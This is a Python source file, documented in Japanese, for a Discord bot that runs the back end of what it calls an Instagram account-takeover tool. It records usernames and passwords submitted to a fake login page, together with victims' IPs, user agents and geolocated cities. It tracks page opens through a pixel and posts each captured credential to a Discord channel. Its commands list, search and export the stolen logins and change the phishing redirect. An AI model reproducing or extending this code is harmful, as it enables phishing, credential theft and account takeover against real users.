"""
Instagram 乗っ取りツール用 Discord Bot（コマンド操作 + 通知）

使い方:
    app.py の先頭で `import discord_bot` するだけで Bot がスレッド起動します。
    Discord の環境変数が未設定でもアプリは落ちず、通知だけスキップされます。

単体テスト:
    python discord_bot.py
"""
from __future__ import annotations

import asyncio
import datetime as dt
import io
import json
import os
import threading
import time
import urllib.request
from collections import deque

# .env があれば読む（ローカル用。無くてもOK）
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

import discord
from discord import app_commands
from discord.ext import commands

# ==========================================================================
# 設定（すべて環境変数）
# ==========================================================================
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "").strip()
GUILD_ID = int(os.environ.get("DISCORD_GUILD_ID", "0") or 0)
LOG_CHANNEL_ID = int(os.environ.get("DISCORD_LOG_CHANNEL_ID", "0") or 0)
ADMIN_ROLE_ID = int(os.environ.get("DISCORD_ADMIN_ROLE_ID", "0") or 0)

# 開封通知の連投を抑える秒数（同一IP）。0で無効。
OPEN_DEBOUNCE = float(os.environ.get("OPEN_DEBOUNCE", "0") or 0)

COLOR_OK = 0x0095F6
COLOR_DIM = 0x8E8E8E
COLOR_ERR = 0xED4956

MAX_ENTRIES = 200

# ==========================================================================
# 共有状態（同一プロセスなので Flask からそのまま触れる）
# ==========================================================================
_lock = threading.Lock()
_creds: deque = deque(maxlen=MAX_ENTRIES)
_stats = {"opens": 0, "submits": 0}
_settings = {
    "redirect": os.environ.get("DEFAULT_REDIRECT", "https://www.instagram.com/"),
    "notify_opens": True,
}
_last_open_at: dict = {}


def add_cred(username, password, ip="", ua="", country="", city=""):
    with _lock:
        _stats["submits"] += 1
        _creds.append({
            "username": username,
            "password": password,
            "ip": ip,
            "ua": ua,
            "country": country,
            "city": city,
            "ts": time.time(),
        })


def add_open(ip=""):
    with _lock:
        _stats["opens"] += 1


def recent(n=10):
    with _lock:
        return list(_creds)[-n:][::-1]


def clear():
    with _lock:
        _creds.clear()
        _stats["opens"] = 0
        _stats["submits"] = 0


def stats():
    with _lock:
        return dict(_stats)


def get(key, default=None):
    with _lock:
        return _settings.get(key, default)


def set_(key, value):
    with _lock:
        _settings[key] = value


def all_settings():
    with _lock:
        return dict(_settings)


def lookup_geo(ip, timeout=2.0):
    """ip-api.com で簡易ジオロケーション。失敗しても例外を出さない。"""
    if not ip:
        return "", ""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city"
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        if data.get("status") == "success":
            return data.get("country", ""), data.get("city", "")
    except Exception:
        pass
    return "", ""


# ==========================================================================
# Bot 本体
# ==========================================================================
class InstaBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!?", intents=discord.Intents.default())
        self.started_at = time.time()

    async def setup_hook(self):
        try:
            if GUILD_ID:
                guild = discord.Object(id=GUILD_ID)
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
                print(f"[discord_bot] コマンドをギルド {GUILD_ID} に同期しました", flush=True)
            else:
                await self.tree.sync()
                print("[discord_bot] コマンドをグローバル同期しました（反映に最大1時間）", flush=True)
        except Exception as exc:
            print(f"[discord_bot] sync failed: {exc}", flush=True)

    async def on_ready(self):
        print(f"[discord_bot] logged in as {self.user} (id={self.user.id})", flush=True)


bot = InstaBot()


# ==========================================================================
# 通知
# ==========================================================================
def _embed(title, desc="", color=COLOR_OK):
    return discord.Embed(title=title, description=(desc or "")[:4000], color=color)


async def _push(title, desc="", color=COLOR_OK):
    if not LOG_CHANNEL_ID:
        return
    try:
        channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
        if channel is not None:
            await channel.send(embed=_embed(title, desc, color))
    except Exception as exc:
        print(f"[discord_bot] push failed: {exc}", flush=True)


def notify(title, desc="", color=COLOR_OK):
    """Flask の同期コンテキストから通知を送る。送れたら True。"""
    loop = getattr(bot, "loop", None)
    if loop is None or not loop.is_running():
        return False
    asyncio.run_coroutine_threadsafe(_push(title, desc, color), loop)
    return True


def is_ready():
    return bot.is_ready()


def cred(username, password, ip="", ua="", country="", city=""):
    """認証情報を記録して Discord に通知する。app.py の /login から呼ぶ。"""
    add_cred(username, password, ip, ua, country, city)
    place = f"\n**位置:** {city}, {country}" if city else ""
    notify(
        "🔑 認証情報を取得",
        f"**User:** `{username}`\n"
        f"**Pass:** `{password}`\n"
        f"**IP:** `{ip}`{place}\n"
        f"**UA:** `{ua[:120]}`",
        COLOR_OK,
    )


def opened(ip="", country="", city=""):
    """ページ開封を記録して通知する。app.py の /open.gif から呼ぶ。"""
    add_open(ip)

    if OPEN_DEBOUNCE > 0 and ip:
        now = time.time()
        if now - _last_open_at.get(ip, 0) < OPEN_DEBOUNCE:
            return
        _last_open_at[ip] = now

    if not get("notify_opens", True):
        return

    place = f" ({city}, {country})" if city else ""
    notify("👀 ページ開封", f"IP: `{ip}`{place}", COLOR_DIM)


# ==========================================================================
# 権限チェック
# ==========================================================================
def _is_admin(interaction: discord.Interaction) -> bool:
    if ADMIN_ROLE_ID == 0:
        return True
    return any(getattr(r, "id", 0) == ADMIN_ROLE_ID for r in getattr(interaction.user, "roles", []))


async def _deny(interaction: discord.Interaction) -> bool:
    if _is_admin(interaction):
        return False
    await interaction.response.send_message("権限がありません", ephemeral=True)
    return True


# ==========================================================================
# コマンド
# ==========================================================================
@bot.tree.command(name="help", description="コマンド一覧を表示")
async def help_cmd(interaction: discord.Interaction):
    body = (
        "**取得データ**\n"
        "`/creds [件数]` 最近の認証情報\n"
        "`/last` 直近1件の詳細\n"
        "`/find <文字列>` ユーザー名/パスワードで検索\n"
        "`/export` txtファイルで出力\n"
        "`/stats` 開封数・送信数\n"
        "`/clear` 全消去\n\n"
        "**操作**\n"
        "`/seturl <url>` ログイン後の遷移先を変更\n"
        "`/url` 現在の遷移先\n"
        "`/opens <true|false>` 開封通知のON/OFF\n"
        "`/settings` 設定一覧\n\n"
        "**その他**\n"
        "`/status` 稼働状況\n"
        "`/test` テスト通知\n"
        "`/ping` 疎通確認"
    )
    await interaction.response.send_message(embed=_embed("コマンド一覧", body), ephemeral=True)


@bot.tree.command(name="creds", description="最近取得した認証情報を表示")
@app_commands.describe(count="表示件数（1〜50）")
async def creds_cmd(interaction: discord.Interaction,
                    count: app_commands.Range[int, 1, 50] = 10):
    rows = recent(count)
    if not rows:
        await interaction.response.send_message("まだ取得していません", ephemeral=True)
        return
    lines = []
    for i, r in enumerate(rows, 1):
        place = f" ({r['city']}, {r['country']})" if r.get("city") else ""
        lines.append(f"`{i}.` **{r['username']}** : `{r['password']}`{place} <t:{int(r['ts'])}:R>")
    await interaction.response.send_message(
        embed=_embed(f"認証情報 {len(rows)} 件", "\n".join(lines))
    )


@bot.tree.command(name="last", description="直近1件の詳細を表示")
async def last_cmd(interaction: discord.Interaction):
    rows = recent(1)
    if not rows:
        await interaction.response.send_message("まだ取得していません", ephemeral=True)
        return
    r = rows[0]
    body = (
        f"**User:** `{r['username']}`\n"
        f"**Pass:** `{r['password']}`\n"
        f"**IP:** `{r['ip']}`\n"
        f"**位置:** {r.get('city') or '-'}, {r.get('country') or '-'}\n"
        f"**UA:** `{r['ua'][:150]}`\n"
        f"**時刻:** <t:{int(r['ts'])}:F>"
    )
    await interaction.response.send_message(embed=_embed("直近の取得", body))


@bot.tree.command(name="find", description="ユーザー名またはパスワードで検索")
@app_commands.describe(keyword="検索する文字列")
async def find_cmd(interaction: discord.Interaction, keyword: str):
    kw = keyword.lower()
    hits = [r for r in recent(MAX_ENTRIES)
            if kw in r["username"].lower() or kw in r["password"].lower()]
    if not hits:
        await interaction.response.send_message(f"`{keyword}` は見つかりませんでした", ephemeral=True)
        return
    lines = [f"**{r['username']}** : `{r['password']}` <t:{int(r['ts'])}:R>" for r in hits[:30]]
    await interaction.response.send_message(
        embed=_embed(f"検索結果 {len(hits)} 件", "\n".join(lines))
    )


@bot.tree.command(name="export", description="取得済み認証情報を txt ファイルで出力")
async def export_cmd(interaction: discord.Interaction):
    rows = recent(MAX_ENTRIES)
    if not rows:
        await interaction.response.send_message("まだ取得していません", ephemeral=True)
        return
    buf = io.StringIO()
    for r in rows:
        ts = dt.datetime.fromtimestamp(r["ts"]).strftime("%Y-%m-%d %H:%M:%S")
        buf.write(f"{ts}\t{r['username']}\t{r['password']}\t{r['ip']}\t{r.get('country','')}\t{r['ua']}\n")
    data = io.BytesIO(buf.getvalue().encode("utf-8"))
    await interaction.response.send_message(
        content=f"{len(rows)} 件", file=discord.File(data, filename="creds.txt")
    )


@bot.tree.command(name="stats", description="開封数・送信数の統計")
async def stats_cmd(interaction: discord.Interaction):
    s = stats()
    body = f"👀 ページ開封: **{s['opens']}**\n🔑 認証情報送信: **{s['submits']}**"
    await interaction.response.send_message(embed=_embed("統計", body))


@bot.tree.command(name="clear", description="取得ログと統計をすべて消去")
async def clear_cmd(interaction: discord.Interaction):
    if await _deny(interaction):
        return
    clear()
    await interaction.response.send_message("ログと統計をクリアしました", ephemeral=True)


@bot.tree.command(name="seturl", description="ログイン後のリダイレクト先を変更")
@app_commands.describe(url="遷移先URL")
async def seturl_cmd(interaction: discord.Interaction, url: str):
    if await _deny(interaction):
        return
    set_("redirect", url)
    await interaction.response.send_message(f"リダイレクト先を `{url}` に変更しました", ephemeral=True)


@bot.tree.command(name="url", description="現在のリダイレクト先を確認")
async def url_cmd(interaction: discord.Interaction):
    await interaction.response.send_message(f"現在: `{get('redirect')}`", ephemeral=True)


@bot.tree.command(name="opens", description="開封通知のON/OFF")
@app_commands.describe(enabled="true で ON / false で OFF")
async def opens_cmd(interaction: discord.Interaction, enabled: bool):
    if await _deny(interaction):
        return
    set_("notify_opens", enabled)
    await interaction.response.send_message(
        f"開封通知: **{'ON' if enabled else 'OFF'}**", ephemeral=True
    )


@bot.tree.command(name="settings", description="現在の設定を一覧表示")
async def settings_cmd(interaction: discord.Interaction):
    s = all_settings()
    body = "\n".join(f"`{k}` = `{v}`" for k, v in s.items())
    body += f"\n\n`OPEN_DEBOUNCE` = `{OPEN_DEBOUNCE}`\n`ADMIN_ROLE_ID` = `{ADMIN_ROLE_ID or 'なし'}`"
    await interaction.response.send_message(embed=_embed("設定", body), ephemeral=True)


@bot.tree.command(name="status", description="Bot の稼働状況")
async def status_cmd(interaction: discord.Interaction):
    up = int(time.time() - bot.started_at)
    h, rem = divmod(up, 3600)
    m, s = divmod(rem, 60)
    body = (
        f"**接続:** {'✅ オンライン' if bot.is_ready() else '❌ オフライン'}\n"
        f"**レイテンシ:** {round(bot.latency * 1000)} ms\n"
        f"**稼働時間:** {h}時間{m}分{s}秒\n"
        f"**記録件数:** {len(_creds)} 件\n"
        f"**通知チャンネル:** {'設定済み' if LOG_CHANNEL_ID else '未設定'}"
    )
    await interaction.response.send_message(embed=_embed("ステータス", body), ephemeral=True)


@bot.tree.command(name="test", description="テスト通知を送信")
async def test_cmd(interaction: discord.Interaction):
    await interaction.response.send_message("送信しました", ephemeral=True)
    await _push("テスト通知", "Bot から正常に送信できています。")


@bot.tree.command(name="ping", description="疎通確認")
async def ping_cmd(interaction: discord.Interaction):
    await interaction.response.send_message(f"pong ({round(bot.latency * 1000)}ms)")


# ==========================================================================
# 起動
# ==========================================================================
def run_bot():
    if not BOT_TOKEN:
        print("[discord_bot] DISCORD_BOT_TOKEN 未設定 → Bot は起動しません", flush=True)
        return
    try:
        bot.run(BOT_TOKEN, log_handler=None)
    except Exception as exc:
        print(f"[discord_bot] crashed: {exc}", flush=True)


def autostart():
    if not BOT_TOKEN:
        print("[discord_bot] DISCORD_BOT_TOKEN 未設定 → Bot は起動しません", flush=True)
        return
    threading.Thread(target=run_bot, daemon=True, name="discord-bot").start()
    print("[discord_bot] Bot スレッドを起動しました", flush=True)


if __name__ == "__main__":
    run_bot()
else:
    autostart()
